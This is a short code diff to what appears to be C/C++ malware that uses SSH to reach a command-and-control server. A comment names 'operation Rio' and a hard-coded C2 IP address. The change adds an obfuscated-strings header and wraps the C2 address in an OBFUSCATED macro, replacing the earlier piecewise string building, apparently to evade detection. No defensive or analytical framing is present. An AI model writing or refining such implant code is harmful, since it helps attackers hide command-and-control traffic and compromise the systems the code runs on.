@@ -10,6 +10,7 @@
 #include "server.h"
 #include "client.h"
 #include "global.h"
+#include "obfuscated_strings.h"
 
 
 
@@ -167,18 +168,16 @@ int main(int argc, char** argv){
     strncat(username, "nym", 100);
     strncat(username, "ous", 100);
     
+    
+#ifdef C2_IP
     //We need the new IP
     //Static IP for operation Rio 35.237.100.68
-    strncat(C2_host, "35.", 100); 
-    strncat(C2_host, "237.", 100);
-    strncat(C2_host, "100.", 100);
-    strncat(C2_host, "68", 100);
-
-    //Then we need to comment this:
-    //parse_args(argc, argv, C2_host, username);
+    strcat_s(C2_host, sizeof(C2_host), OBFUSCATED(C2_IP));
+#else
+    parse_args(argc, argv, C2_host, username);
+#endif // C2_IP
 
     ssh_init(); // libssh mandatory
-
     
     SSHServer* server = new SSHServer();
     SSHClient* client = new SSHClient();
